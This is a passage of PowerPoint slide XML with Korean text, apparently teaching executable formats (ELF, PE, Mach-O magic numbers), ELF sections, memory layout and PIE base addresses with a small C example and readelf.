              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="2000" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t>)</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939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97980D-3C0D-DEF2-2EFF-B57E838DE9E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1966940" y="3228945"/>
            <a:ext cx="691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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>Linux</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939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4A5BD0-AE9F-43A0-48F8-EC38CF5B3E69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5894002" y="3228945"/>
            <a:ext cx="1114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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>Windows</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
              <a:latin typeface="+mj-ea"/>
              <a:ea typeface="+mj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C8095D9-830D-BD56-5420-A7B0FE385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08" y="3657422"/>
            <a:ext cx="3835281" cy="48853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DAF4D887-47C6-180C-A1F8-6C5349BF7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221" y="3675285"/>
            <a:ext cx="3678420" cy="48807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5CA1F55-A149-5AC4-DA29-289E14E78101}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1187560"/>
            <a:ext cx="99459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spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>시스템에서 실행되는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실행 파일</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>은 운영체제의 영향을 받습니다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/>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>운영체제</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>란</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 같은 하드웨어의 위에 깔리는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소프트웨어</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 대표적으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Windows, Linux, Darwin(Apple) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이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/>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>실행 파일의 가장 첫 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4Bytes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>는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Magic Number</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 이 값을 확인하면 어떠한 운영체제에서 실행될 수 있는 파일인지 알 수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4927FD-C59A-9367-CC27-585CD0C6B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4568" y="3677582"/>
            <a:ext cx="2107419" cy="485778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80C5FA96-6F37-0AD7-F430-CFDAE659F301}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8676780" y="4209300"/>
            <a:ext cx="2627374" cy="743849"/>
            <a:chOff x="856269" y="5390664"/>
            <a:chExt cx="2627374" cy="74384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E85B3A-BD19-07FE-74F6-20549326A0AF}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="876391" y="5826736"/>
              <a:ext cx="26072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400" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Magic Number </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>(0xCFFAEDFE) </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>확인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A936F5D-141F-96D0-F3E6-01A9B4D9AD5C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="856269" y="5390664"/>
              <a:ext cx="24384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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t>Mach-o</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="2000" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t>(Mach Object)</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939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3473A0D-8D2C-DF17-E823-20C1DA9C414C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9066346" y="3228945"/>
            <a:ext cx="1659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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>Darwin (Apple)</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939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3617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BE701-9296-A7FA-1C99-3AC3FB81D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A1AE490-8616-E278-0B9D-B57A8B56D0D3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BEE532-F471-492F-AA3F-7A34EAEEAECD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="1877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B469D-B4DF-02F1-DBD0-0E44F8A18E7A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38AC884-D595-2E43-3C39-A2294F683E5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="364308" y="2086402"/>
            <a:ext cx="5473418" cy="39653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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdio.h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int data = 1;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int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;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const char *</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rodata</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rodata</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>";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int main() {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int local1;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int local2 = 1;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      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("Hello Section");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return 0;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6FCFF6-59CF-FAE8-46ED-22D43ED571B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="5029627"/>
            <a:ext cx="4137474" cy="1141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j-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>address : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>프로그램 실행 시 해당 영역이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>로드될</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t> 주소</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0"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j-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>offset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  <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>: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  <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>ELF </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>파일 내에서의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>offset </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>주소</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
              <a:latin typeface="+mj-ea"/>
              <a:ea typeface="+mj-ea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+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>size : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>해당 영역 사이즈 크기</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
              <a:latin typeface="+mj-ea"/>
              <a:ea typeface="+mj-ea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C2AA88AB-5157-08B5-6056-86DE61E7A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86402"/>
            <a:ext cx="5829300" cy="29432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601EBC0-AFF7-1F0A-E37C-4F2BDC57F948}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1178876"/>
            <a:ext cx="99459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예제 코드를 통해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x86_64 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>linux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환경의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ELF </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>실행 파일 동작 흐름을 살펴 보겠습니다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우선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readelf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -S --wide test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ELF </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>파일의 섹션을 확인합니다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193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0029E-DC5C-56C9-AFCF-63A9D412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69D8B0C-6A99-26CC-A1AA-C3F1E188BEB9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1C679-80A7-4E18-9F05-B0B027663BBA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3538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section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596CE-57E0-A77A-F65D-35DF8BBDC8BC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220FBD-EBEA-DFD4-19BC-3C723FF99E80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1157725"/>
            <a:ext cx="994590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section</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이란 실행 파일 내 각 기능에 따른 영역들을 나타냅니다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프로그램은 런타임 중 각 섹션을 참조하며 실행됩니다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ELF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 실행 파일의 주요 섹션은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.text, .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plt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, .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got.plt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, .data, .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bss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, .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rodata</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, .heap, .stack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>등등이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D1BF2BEC-82EF-B771-4D6D-6245185A9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77141"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="875104" y="2236223"/>
          <a:ext cx="9945909" cy="3730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14317">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2748037351"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4117779">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="820828031"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4013813">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4151580948"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="378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section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3200"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="378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.text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작성된 코드가 저장된 영역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실행 권한 존재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printf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(“hello world”) =&gt; call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printf@plt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200448"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="378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.data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초기화된 전역 변수가 저장된 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 global = 1;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전역으로 초기화된 데이터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358619"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="378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.</a:t>
                      </a:r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bss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초기화되지 않은 전역 변수 및 정적 변수가 저장된 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int global;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(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전역이지만 초기화되지 않은 데이터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</a:rPr>
                        <a:t>)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00695"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="378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rodata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읽기 권한만 존재하는 데이터가 저장된 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const char *str = "Hello, World!";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상수 형태의 데이터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6960"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="378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.heap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동적 메모리 할당을 위한 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 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="14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arr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=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malloc(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="14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sizeof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(int)); (</a:t>
                      </a:r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동적 메모리 할당 영역</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR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289467"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3787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plt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외부 함수 호출 시 간접 호출할 주소가 저장된 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strcpy@plt</a:t>
                      </a:r>
                      <a:endParaRPr lang="ko-KR" altLang="en-US" sz="14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256947"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="4356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400" b="1" spc="-15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got.plt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plt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간접 호출 후 외부함수 실제 주소가 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US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적혀있는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로드된 라이브러리 파일 내 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="14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strcpy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함수의 실제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714054"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="6438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spc="-15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.stack</a:t>
                      </a:r>
                      <a:endParaRPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-15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프로그램 런타임 중 사용될 스택 영역</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" altLang="ko-KR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스택을 사용해 함수 호출</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR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복귀 등등을 수행</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" altLang="ko-KR" sz="14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134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06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696EF-A2F1-A268-DA6E-F0B0C2BD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F41161B-E9D9-14CF-6393-38A7815512E1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136E56-1443-71CE-3648-9DC9EB24AF62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3538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section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1B9A7-495C-0341-AAC1-0B30322F15C9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913D0D-07EA-2480-977B-60D9951AF672}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1157725"/>
            <a:ext cx="9945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프로그램에서 섹션 구조를 간단하게 하면 다음과 같습니다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6" name="그림 5" descr="텍스트, 친필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79BADFB-365E-D6B9-EEAB-47016DAE11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080" y="1997831"/>
            <a:ext cx="5341458" cy="41840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30B0E4-F6E8-A76D-7F70-0886170875C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6174377" y="2828038"/>
            <a:ext cx="47681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가장 첫 메모리 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0x0</a:t>
            </a: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부터 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.heap</a:t>
            </a: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까지는 프로그램의 영역이며 아래에 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library</a:t>
            </a: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 부분은 외부 라이브러리가 로드 됩니다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외부 라이브러리도 마찬가지로 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ELF </a:t>
            </a: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파일이므로 실행파일과 똑같이 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.text, .data </a:t>
            </a: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섹션 등이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0" err="1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로드됩니다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그 밑에 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stack </a:t>
            </a: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영역이 자리잡고 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stack (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0" err="1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rsp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를 통해 함수 호출 및 복귀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Malgun Gothic Semilight" panose="020B0503020000020004" pitchFamily="34" charset="-127"/>
                <a:cs typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>인자 저장 등등 과정을 수행합니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939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635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DEFE3-7EAA-3991-02D5-B32D5187C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9128DD-5146-5D26-CD0D-81E52D70398D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9E3A6-7EFB-0F64-1BF1-2F7F06C031BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3488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section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DF324-CC32-96A9-D344-DBF2364D0A9B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DA22E4-779D-3D5A-5FCD-70A07C8EC0AE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195126" y="2026936"/>
            <a:ext cx="432261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프로그램 디버깅 시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PIE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법으로 인해 프로그램의 시작 지점이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x555555554000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>으로 지정되었습니다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하지만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로드되는 메모리 주소가 달라질 뿐 실행 파일 자체의 오프셋은 변하지 않습니다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PIE_base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값</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(0x555555554000)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.data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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
